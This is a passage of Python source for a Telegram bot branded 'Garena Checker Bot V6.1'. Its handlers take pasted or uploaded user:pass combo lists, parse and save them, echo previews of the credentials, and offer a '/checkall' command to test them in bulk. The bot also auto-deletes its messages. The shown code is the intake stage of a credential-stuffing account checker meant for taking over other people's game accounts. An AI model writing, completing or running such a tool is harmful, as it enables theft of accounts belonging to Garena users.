    threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()

@bot.message_handler(content_types=['text'])
def handle_text(message):
    if not check_membership(message):
        return
    global pending_accounts
    text = message.text.strip()
    chat_id = message.chat.id
    if text.startswith('/'):
        return
    accounts, _ = loc_tk_mk_only(text.replace('|', ':'))
    if not accounts:
        return
    if chat_id not in pending_accounts:
        pending_accounts[chat_id] = []
    pending_accounts[chat_id] = accounts
    save_loc_file(accounts)
    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
    total = len(accounts)
    safe_send_message(chat_id, f"📊 LOC {total} ACCOUNTS\nPreview:\n{preview}\n👇 /checkall - Check tat ca")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not check_membership(message):
        return
    global pending_accounts
    chat_id = message.chat.id
    try:
        file_name = message.document.file_name or ""
        if not file_name.endswith('.txt'):
            safe_send_message(chat_id, "❌ Chi ho tro file .txt!", auto_delete=True, delete_after=5)
            return
        file_info = bot.get_file(message.document.file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        accounts, _ = loc_tk_mk_only(content.replace('|', ':'))
        if not accounts:
            safe_send_message(chat_id, "❌ Khong tim thay user:pass!", auto_delete=True, delete_after=5)
            return
        if chat_id not in pending_accounts:
            pending_accounts[chat_id] = []
        pending_accounts[chat_id] = accounts
        save_loc_file(accounts)
        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
        total = len(accounts)
        safe_send_message(chat_id, f"✅ LOC {total} ACCOUNTS\nPreview:\n{preview}\n👇 /checkall - Check tat ca")
    except Exception as e:
        safe_send_message(chat_id, f"❌ Loi: {e}", auto_delete=True, delete_after=5)

def main():
    print("=" * 60)
    print("    GARENA CHECKER BOT V6.1 - FULL FIX")
    print("    ADMIN: @baohuyno1")
    print("    ===== LOC ACC BAN - KHONG HIEN THI ===== ")
    print("    ===== AN TRUONG RONG/NO/0 ===== ")
    print("    ===== CO DONG KHUNG + LOI DAN ===== ")
    print("    ===== TU DONG XOA LENH + TIN NHAN ===== ")
    print("=" * 60)
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"[!] Loi: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot dung!")
        sys.exit(0)
